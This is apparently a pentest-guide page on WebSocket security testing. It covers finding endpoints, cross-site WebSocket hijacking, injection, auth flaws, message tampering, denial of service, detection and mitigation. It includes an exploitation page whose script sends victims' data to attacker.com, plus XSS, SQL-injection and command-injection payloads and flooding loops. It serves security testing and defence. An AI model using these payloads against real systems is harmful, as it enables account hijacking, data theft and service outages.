% Filename: 04-web-testing/api-testing/websocket.md
% Display name: WebSocket Testing
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# WebSocket Testing

## Overview

WebSockets provide full-duplex, persistent communication channels between client and server over a single TCP connection. After an initial HTTP upgrade handshake, both sides can send messages at any time. WebSockets are used for real-time features — chat, notifications, live dashboards, collaborative editing, and gaming.

Security issues arise because WebSocket connections bypass many traditional HTTP security controls. Same-origin policy enforcement is weaker, session management is often inconsistent between HTTP and WebSocket contexts, and message validation may be lacking since developers assume the persistent connection is "trusted" after the initial handshake.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Target application uses WebSocket connections (`ws://` or `wss://`)
- WebSocket endpoint URL identified (JavaScript source, network traffic, proxy)
- Proxy capable of intercepting WebSocket frames (Burp Suite, OWASP ZAP)

## Detection Methodology

### Identifying WebSocket Endpoints

Look for WebSocket connections in:

- **JavaScript source code:** search for `new WebSocket(`, `ws://`, `wss://`
- **Network tab:** filter by "WS" in browser developer tools
- **Proxy history:** WebSocket upgrade requests show `Connection: Upgrade` and `Upgrade: websocket` headers

```bash
# curl
# https://curl.se/
# Download and search JavaScript for WebSocket URLs
curl -s http://target.com/static/js/app.js | grep -oE "(ws|wss)://[^\"' ]*" | sort -u
```

### Connection Testing

websocat is not in the Kali apt repositories. Install from the GitHub releases page (pre-built binary):
`curl -sLo /usr/local/bin/websocat https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl && chmod +x /usr/local/bin/websocat`

```bash
# websocat
# https://github.com/vi/websocat
# Connect and interact with a WebSocket endpoint
websocat ws://target.com/ws

# Connect to TLS WebSocket (accept self-signed certs)
websocat -k wss://target.com/ws

# Send a single message and disconnect
echo '{"action":"ping"}' | websocat -1 ws://target.com/ws

# Verbose connection (shows handshake)
websocat -v ws://target.com/ws
```

### Handshake Analysis

The WebSocket handshake is a standard HTTP request:

```text
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://target.com
Cookie: session=abc123
```

Check the server response for:

- Does the server validate the `Origin` header?
- Are cookies sent and validated during the handshake?
- Is there a `Sec-WebSocket-Protocol` subprotocol negotiation?

## Techniques

### Cross-Site WebSocket Hijacking (CSWSH)

CSWSH is the WebSocket equivalent of CSRF. If the server does not validate the `Origin` header during the WebSocket handshake, an attacker's page can establish a WebSocket connection to the target and read responses — because WebSocket connections are not restricted by the same-origin policy after the handshake.

**Test for Origin validation:**

```bash
# curl
# https://curl.se/
# Send WebSocket upgrade with a foreign Origin
curl -s -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: http://attacker.com" \
  -H "Cookie: session=VICTIM_SESSION_COOKIE" \
  http://target.com/ws
```

If the server responds with `101 Switching Protocols` despite the foreign Origin, it is vulnerable to CSWSH.

**Exploitation page (host on attacker-controlled domain):**

```html
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    ws.send('{"action":"get_profile"}');
};
ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
};
</script>
```

The victim's browser sends their cookies with the handshake request, authenticating the attacker's WebSocket connection.

### Message Injection

WebSocket messages often lack the input validation applied to HTTP requests.

```bash
# websocat
# https://github.com/vi/websocat
# Test injection payloads in WebSocket messages

# XSS (if messages are rendered in HTML)
echo '{"message":"<img src=x onerror=alert(1)>"}' | websocat -1 ws://target.com/ws

# SQL injection (if messages are stored in a database)
echo '{"search":"admin\" OR 1=1 --"}' | websocat -1 ws://target.com/ws

# Command injection
echo '{"filename":"test; id"}' | websocat -1 ws://target.com/ws
```

### Authentication and Authorization Issues

WebSocket connections may not maintain the same authorization context as HTTP:

```bash
# websocat
# https://github.com/vi/websocat
# Connect without authentication (test if handshake requires auth)
websocat ws://target.com/ws

# Test if post-handshake messages require auth tokens
echo '{"action":"admin_action"}' | websocat -1 ws://target.com/ws

# Test if connection survives session invalidation
# 1. Establish WebSocket while authenticated
# 2. Log out via HTTP (invalidate session)
# 3. Send messages over the still-open WebSocket
# If messages succeed, the server does not re-validate session state
```

### Message Manipulation

Intercept and modify WebSocket messages in transit:

**Via Burp Suite:**

1. Navigate to the target application (WebSocket connection appears in the WebSocket history tab)
2. In Proxy > WebSocket history, view sent and received messages
3. Set interception rules for WebSocket messages (Proxy > Options > Intercept WebSocket Messages)
4. Modify message content before forwarding

**Message tampering patterns:**

```bash
# Change recipient (message intended for user A sent to user B)
Original:  {"to":"user_42","message":"hello"}
Modified:  {"to":"user_1","message":"hello"}

# Escalate privileges in message payload
Original:  {"action":"view","resource":"public_data"}
Modified:  {"action":"delete","resource":"admin_config"}

# Replay messages (send the same message multiple times)
# Some WebSocket implementations lack replay protection
```

### Denial of Service

```bash
# websocat
# https://github.com/vi/websocat
# Send large payload (test message size limits)
python3 -c "print('A' * 1000000)" | websocat -1 ws://target.com/ws

# Rapid message flooding
while true; do echo '{"ping":"test"}'; done | websocat ws://target.com/ws

# Open many concurrent connections (test connection limits)
for i in $(seq 1 100); do
  websocat ws://target.com/ws &
done
```

## Detection Methods

### Network-Based Detection

- WebSocket upgrade requests with foreign `Origin` headers (CSWSH attempts)
- Injection payloads in WebSocket message content (XSS, SQLi patterns)
- Anomalous message volume or size from a single connection
- WebSocket connections that persist after HTTP session invalidation

### Host-Based Detection

- WebSocket message processing errors indicating injection attempts
- Unusual data access patterns through WebSocket-connected services
- Connection count spikes from single IP addresses
- Messages referencing resources outside the authenticated user's scope

## Mitigation Strategies

- **Validate the Origin header** — reject WebSocket handshakes from unexpected origins. This is the primary defense against CSWSH
- **Authenticate the handshake** — require valid session cookies or tokens during the WebSocket upgrade. Verify authentication state, not just the presence of a cookie
- **Re-validate sessions** — periodically check that the session associated with a WebSocket connection is still valid. Close connections when sessions expire
- **Message validation** — apply the same input validation and sanitization to WebSocket messages as to HTTP request parameters. Do not trust WebSocket messages simply because the connection was authenticated
- **Rate limiting** — enforce per-connection message rate limits and maximum message sizes. Drop connections that exceed thresholds
- **Use WSS (TLS)** — always use `wss://` in production to prevent message interception and modification in transit

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - WebSocket Vulnerabilities](https://portswigger.net/web-security/websockets)
- [OWASP - Testing WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
